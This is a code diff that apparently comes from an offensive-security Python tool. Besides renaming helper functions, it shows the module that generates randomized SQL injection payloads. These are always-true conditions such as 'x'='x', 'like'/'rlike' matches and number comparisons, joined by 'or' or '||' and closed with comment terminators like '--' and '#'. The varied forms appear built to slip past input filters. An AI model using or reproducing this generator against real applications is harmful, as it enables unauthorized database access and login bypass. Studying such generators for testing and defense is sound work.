@@ -1,4 +1,4 @@
-from cores.actions import randomFromList, srand
+from cores.actions import list_choose_randomly, string_gen_randomly
 
 
 def truecon():
@@ -17,19 +17,19 @@ def truecon():
 	
 	# Payload template: ['or' | '||'] [condition]
 	def cCon():
-		return randomFromList(["or", "||"])
+		return list_choose_randomly(["or", "||"])
 	
 	def sCon():
-		conType = randomFromList(["equal", "static", "compare"])
+		conType = list_choose_randomly(["equal", "static", "compare"])
 		# Could be faster than create a dict and call element from dict
 		if conType == "static":
-			return randomFromList(["not false", "true"])
+			return list_choose_randomly(["not false", "true"])
 		
 		elif conType == "compare":
-			genType = randomFromList(["like", "rlike", "not like", "gl"])
+			genType = list_choose_randomly(["like", "rlike", "not like", "gl"])
 			
 			if genType == "gl":
-				_stri1, _stri2 = srand(stype = "dig"), srand(stype = "dig")
+				_stri1, _stri2 = string_gen_randomly(select_type ="dig"), string_gen_randomly(select_type ="dig")
 				if int(_stri1) > int(_stri2):
 					return "%s > %s" % (_stri1, _stri2)
 				else:
@@ -37,19 +37,19 @@ def truecon():
 			
 			elif genType == "not like":
 				while True:
-					_stri1, _stri2 = srand(stype = "char"), srand(stype = "char")
+					_stri1, _stri2 = string_gen_randomly(select_type ="char"), string_gen_randomly(select_type ="char")
 					# MAKE SURE WE ARE HAVING NOT LIKE
 					if _stri1 != _stri2:
 						break
 				return "'%s' %s '%s'" % (_stri1, genType, _stri2)
 			
 			else:
-				_stri = srand(min = 3, max = 5, stype = "char")
+				_stri = string_gen_randomly(len_min = 3, len_max = 5, select_type ="char")
 				return "'%s' %s '%s'" % (_stri, genType, _stri)
 		
 		elif conType == "equal":
-			genType = randomFromList(["char", "dig"])
-			_stri = srand(min = 3, max = 5, stype = genType)
+			genType = list_choose_randomly(["char", "dig"])
+			_stri = string_gen_randomly(len_min = 3, len_max = 5, select_type = genType)
 			if genType == "char":
 				return "'%s'='%s'" % (_stri, _stri)
 			elif genType == "dig":
@@ -60,7 +60,7 @@ def truecon():
 
 def sPayload():
 	def sEnd():
-		return randomFromList(["-- --", "#", "--"])
+		return list_choose_randomly(["-- --", "#", "--"])
 	
 	# Generate random SQL injection payload
 	# Payload template: [X / X' / X')] [True condition] [-- / #]
